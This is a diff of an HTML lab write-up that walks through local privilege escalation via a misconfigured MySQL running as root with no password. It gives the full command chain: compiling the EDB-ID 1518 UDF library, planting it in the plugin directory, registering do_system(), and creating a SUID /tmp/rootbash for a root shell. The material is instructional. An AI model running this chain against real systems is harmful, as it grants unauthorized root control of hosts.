@@ -69,49 +69,55 @@
             <section id="One">
                 <div class="section-header">Service Exploits - MySQL</div>
 	    	<div class="section-content">
-			<p>The first challenge informs us that there is an incorrectly configured MySQL service running as root. It also tells us there is no password! Let us start a command-line client session and connect to the MySQL server as the user root.</p>
+			<p>The challenge presents an incorrectly configured MySQL service running as root with no password set. Connect as root:</p>
 	                <pre><code>user@debian:~$ mysql -u root</code></pre>
-	                <p>Sure enough the connection was successful. No password required!</p>
+	                <p>Connection succeeds without a password prompt:</p>
 	                <pre><code>mysql> SELECT USER();
 +--------------------+
 | USER()             |
 +--------------------+
 | root@localhost     |
 +--------------------+</code></pre>
-	                <p>Next, let us see what privileges are assigned to our currently logged-in MySQL user, in our case root. Understanding these permissions will help us identify our potential next steps and what avenues are open to us for further exploiting the machine.</p>
+	                <p>Check the MySQL user's privileges:</p>
 	                <pre><code>mysql> SHOW GRANTS FOR CURRENT_USER;</code></pre>
-	                <p>Gives the output: </p>
+	                <p>Output:</p>
 	                <pre><code>+---------------------------------------------------------------------+
 | Grants for root@localhost                                           |
 +---------------------------------------------------------------------+
 | GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION |
 +---------------------------------------------------------------------+</code></pre>
-	                <p>Excellent. Our user, root, has "ALL PRIVILEGES" set, meaning we have complete access to all databases and tables on the MySQL server. This challenge has practically handed us the exploit to use and even placed the necessary code on the target server. However, let's perform the steps manually for learning purposes. The exploit in question can be found <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518).</p>
-	                <p>The exploit code <a href="https://www.exploit-db.com/exploits/1518">here</a> (EDB-ID: 1518) leverages a vulnerability in MySQL's User Defined Functions (UDFs) to achieve local privilege escalation. UDFs extend MySQL functionality by allowing users to create custom functions written in C, loaded as shared libraries. In this exploit, the code defines a UDF, <strong>do_system()</strong>, which executes shell commands using the C standard library function <strong>system()</strong>. We can invoke our UDF through MySQL and instruct it to spawn a shell. Since MySQL is running as the root user, any system command exectued through <strong>do_system()</strong> will also run with root privileges. This means we can achieve a root shell, gaining full control over the target system</p>
-	                <p>Navigate to the "/tmp" directory and create a file to hold the UDF exploit code.</p>
+	                <p><strong>ALL PRIVILEGES</strong> on every database and table — this covers the MySQL-side prerequisite (FILE for writing the UDF shared object to the plugin directory via <strong>SELECT INTO DUMPFILE</strong>, plus the privileges to register and invoke the function). The OS-side prerequisite is separate: the <strong>mysqld</strong> daemon itself must be running as the OS root user, because the UDF's <strong>system()</strong> calls spawn shell processes that inherit mysqld's OS UID. If mysqld runs as a dedicated <strong>mysql</strong> system account, the same UDF chain installs and executes cleanly but the resulting shell runs as <strong>mysql</strong>, not root. Verify with ps:</p>
+	                <pre><code>user@debian:~$ ps -ef | awk 'NR==1 || /[m]ysqld/'
+UID        PID  PPID  C STIME TTY          TIME CMD
+root      2221     1  0 06:41 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+root      2346  2221  0 06:41 ?        00:00:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
+root      2347  2221  0 06:41 ?        00:00:00 logger -t mysqld -p daemon.error</code></pre>
+	                <p>UID column shows <strong>root</strong> for both mysqld and its parent <strong>mysqld_safe</strong>; <strong>--user=root</strong> is explicit in mysqld's argv. Both prerequisites met. The exploit is a User Defined Function chain — <a href="https://www.exploit-db.com/exploits/1518">EDB-ID 1518</a>.</p>
+	                <p>UDFs extend MySQL by loading C functions from shared libraries. The exploit defines a UDF, <strong>do_system()</strong>, wrapping the C standard library <strong>system()</strong> call — arbitrary shell commands invocable from SQL.</p>
+	                <p>Create the UDF source file in /tmp:</p>
 	                <pre><code>user@debian:/tmp$ nano exploit_udf.c</code></pre>
-	                <p>Paste the exploit code into the file, ensure it is copied exactly, as any syntax errors will casue issues during compilation. Once you have saved the file, compile it using <strong>gcc</strong> to produce a shared object (.so) file:</p>
+	                <p>Paste the exploit source from EDB-ID 1518. Compile to a shared object with <strong>gcc</strong>:</p>
 	                <pre><code>user@debian:/tmp$ gcc -Wall -fPIC -shared -o exploit_udf.so exploit_udf.c -lc</code></pre>
-	                <p>Connect to the MySQL server and switch to the <strong>MySQL</strong> system database:</p>
+	                <p>Reconnect to MySQL and switch to the <strong>mysql</strong> system database:</p>
 	                <pre><code>mysql> use mysql
 Reading table information for completion of table and columns names
 You can turn off this feature to get a quicker startup with -A
 		
 Database changed
 mysql> </code></pre>
-	                <p>Create a new table "foo" with a single column, let's a call it "line", of type "BLOB":</p>
+	                <p>Create a single-column BLOB table to stage the shared object:</p>
 	                <pre><code>mysql> create table foo(line blob);
 Query OK, 0 rows affected (0.01 sec)</code></pre>
-	                <p>Load the shared object file we created earlier in to the table, "foo":</p>
+	                <p>Load the shared object into the table:</p>
 	                <pre><code>mysql> insert into foo values(load_file('/tmp/exploit_udf.so'));
 Query OK, 1 row affected (0.00 sec)</code></pre>
-	                <p>Dump the contents of the "foo" table into a file, effectively placing the UDF shared object file in a directory where MySQL expects to find plugin libraries:</p>
-	                <pre><code>mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/exploit.so';
+	                <p>Dump the row into MySQL's plugin directory:</p>
+	                <pre><code>mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/exploit_udf.so';
 Query OK, 1 row affected (0.00 sec)</code></pre>
-	                <p>Create a custom MySQL function called "do_system" that will be available for use in SQL queries. The "soname" directive tells MySQL to load the function from the shared library "exploit_udf.so":</p>
+	                <p>Register the UDF. The "soname" clause points MySQL at the shared library:</p>
 	                <pre><code>mysql> create function do_system returns integer soname 'exploit_udf.so';
 Query OK, 0 rows affected (0.00 sec)</code></pre>
-	                <p>Use the custom function to copy the "/bin/bash" binary to "/tmp/rootbash", and set the SUID bit so we can run it as root, the creator of the file, also make it executable:</p>
+	                <p>Invoke the UDF to copy bash to /tmp/rootbash with the SUID bit set:</p>
 	                <pre><code>mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 +---------------------------------------------------------------------+
 | do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash')    |
@@ -119,11 +125,10 @@ Query OK, 0 rows affected (0.00 sec)</code></pre>
 |                                                                   0 |
 +---------------------------------------------------------------------+
 1 row in set (0.00 sec)</code></pre>
-	                <p>Exit the MySQL client and run the root shell ("-p" is important here as it tells BASH not to reset the environment variables to default, which would typically strip out any special environment variables or manipulations that may have been set during the earlier steps of our attack).</p>
+	                <p>Exit MySQL and execute the SUID bash. The "-p" flag preserves the effective UID — without it, bash drops privileges back to the calling user when launched SUID:</p>
 	                <pre><code>user@debian:/tmp$ /tmp/rootbash -p
 rootbash-4.1# whoami
 root</code></pre>
-	                <p><strong>Congratulations, you own the system!</strong></p>
 		</div>
                 </div>
             </section>
